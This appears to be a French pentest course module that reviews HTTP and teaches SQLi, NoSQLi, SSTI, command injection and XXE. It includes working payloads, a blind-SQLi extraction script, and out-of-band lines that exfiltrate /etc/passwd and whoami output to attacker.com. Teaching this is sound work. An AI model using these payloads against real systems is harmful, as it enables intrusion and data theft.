Rappels HTTP & Injections avancées

J1 · 11h15—12h30 · 1h15 · Théorie + TP guidé pas à pas

Révision du protocole HTTP essentiel au pentest web, suivie d'une plongée dans les injections avancées : SQLi, NoSQLi, SSTI, Command Injection, XXE. Chaque injection est immédiatement taggée MITRE ATT&CK. TP guidé pas à pas sur le lab.

1 Rappels HTTP essentiels

Cycle requête/réponse

# Requête HTTP typique
GET /login HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
Cookie: session=eyJhbGciOiJIUzI1NiIs...
Authorization: Bearer eyJ...

# Réponse HTTP
HTTP/1.1 200 OK
Set-Cookie: session=new_value; HttpOnly; Secure; SameSite=Lax
Content-Type: text/html
Content-Length: 1234

🔒 Cookies & Attributs

  • HttpOnly : inaccessible via JS (protection XSS)
  • Secure : envoyé uniquement en HTTPS
  • SameSite : Lax / Strict / None (protection CSRF)
  • Domain & Path : scope du cookie

🔒 Headers de sécurité

  • CSP (Content-Security-Policy)
  • HSTS (Strict-Transport-Security)
  • X-Frame-Options
  • Access-Control-Allow-Origin (CORS)
  • Leur absence = vulnérabilité exploitable

Méthodologie de pentest web

1. Reconnaissance T1592 → 2. Mapping (endpoints, params) → 3. Identification (versions, technos) → 4. Exploitation T1190 → 5. Post-exploitation T1505.003

NIS2 & Sécurité des applications web

La directive NIS2 (art. 21) impose aux entités essentielles et importantes des mesures de gestion des risques incluant la sécurité de la chaîne d'approvisionnement logicielle, le codage sécurisé et les tests d'intrusion réguliers. Les injections (SQLi, SSTI, Command Injection) restent les vulnérabilités les plus exploitées contre les applications web des OIV et OSE.

2 SQL Injection avancée T1190

Types de SQLi

TypeDescriptionComplexité
Union-basedUtilise UNION SELECT pour extraire des données★☆☆
Error-basedProvoque des erreurs SQL contenant des données★★☆
Boolean blindInférence bit par bit via différences de réponse★★★
Time-based blindInférence via délais (SLEEP)★★★
Out-of-bandExfiltration via DNS/HTTP (exfiltration lourde)★★★★
Second-orderPayload stocké puis exécuté plus tard★★★★

Exemple : Time-based blind SQLi

-- MySQL time-based blind
' OR IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0) --

-- PostgreSQL time-based blind
' OR (SELECT CASE WHEN (ASCII(SUBSTRING(password,1,1))=97) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='admin') --

-- MSSQL time-based (via WAITFOR)
'; IF (SELECT ASCII(SUBSTRING(name,1,1)) FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users'))=97 WAITFOR DELAY '0:0:5' --

TP guidé : exploitation d'une blind SQLi

  1. Identifier le point d'injection via un délai de 5 secondes
  2. Utiliser sqlmap avec --technique=T (time-based)
  3. Écrire un script Python d'extraction caractère par caractère
import requests
import string

url = "http://target.com/api/user?id=1"
charset = string.ascii_letters + string.digits + "!@#$%^&*()"

def extract_string(query, length=32):
    result = ""
    for pos in range(1, length+1):
        for char in charset:
            payload = f"1' OR IF(SUBSTRING(({query}),{pos},1)='{char}', SLEEP(2), 0) -- "
            try:
                r = requests.get(url, params={"id": payload}, timeout=3)
            except requests.exceptions.Timeout:
                result += char
                print(f"[+] Position {pos}: {char} -> {result}")
                break
        else:
            break
    return result

# Extraction du mot de passe admin
db = extract_string("SELECT database()", 20)
print(f"[DB] {db}")

3 NoSQL Injection (MongoDB) T1190

Principe

Quand l'application utilise MongoDB et insère directement les entrées utilisateur dans une requête NoSQL. Exploitation via les opérateurs MongoDB ($ne, $gt, $regex, $where).

# Bypass d'authentification MongoDB
# Au lieu de {"username": "admin", "password": "xxx"}
# On envoie :

{"username": {"$ne": ""}, "password": {"$ne": ""}}

# Extraction via $regex (blind)
{"username": "admin", "password": {"$regex": "^a.*"}}   # test si commence par 'a'
{"username": "admin", "password": {"$regex": "^aa.*"}}  # test si commence par 'aa'

NoSQLi via $where (injection JS)

# $where permet d'injecter du JavaScript dans MongoDB
# Extraction via time-based

{"$where": "sleep(5000) || true"}

# Exfiltration plus avancée
{"$where": "function(){ var d = new Date(); do{ var n = new Date(); } while(n-d < 5000); return true; }"}

4 SSTI — Server-Side Template Injection T1190

Détection

Le SSTI survient quand l'application concatène une entrée utilisateur dans un template serveur (Jinja2, Twig, Freemarker, etc.).

# Payloads de détection universels
{{7*7}}
{{7*'7'}}
${{7*7}}
#{7*7}
<%= 7*7 %>

# Si le résultat est 49 → SSTI confirmé !

# Framework-specific detection
{{config}}           # Jinja2 / Flask
{{self}}             # Jinja2
{{_self}}            # Twig
${7*7}               # Freemarker
${{7*7}}             # Velocity
<%= File.read('/etc/passwd') %>  # ERB (Ruby)

Exploitation Jinja2 RCE

# Jinja2 RCE via subprocess.Popen
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}

# Jinja2 RCE via lipsum
{{ lipsum.__globals__.os.popen('id').read() }}

# Jinja2 RCE via config (Python 3)
{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}

# Twig RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

# Freemarker RCE
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}

5 Command Injection T1059.004

Opérateurs de chaînage

Utile quand l'application appelle une commande système avec des paramètres contrôlables :

# Linux
command1; command2     # exécute les deux
command1 && command2   # exécute command2 si command1 réussit
command1 || command2   # exécute command2 si command1 échoue
command1 | command2    # pipe
`command`              # substitution
$(command)             # substitution

# Blind command injection via time-based
; sleep 5
| sleep 5
|| sleep 5

# Blind command injection via out-of-band
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/`hostname`
; nslookup $(cat /etc/passwd | base64).attacker.com

6 XXE — XML External Entity T1190

Payload classique

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

# Blind XXE out-of-band
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>

# evil.dtd hébergé chez l'attaquant :
# <!ENTITY % file SYSTEM "file:///etc/passwd">
# <!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://attacker.com/?data=%file;'>">
# %eval;
# %exfil;
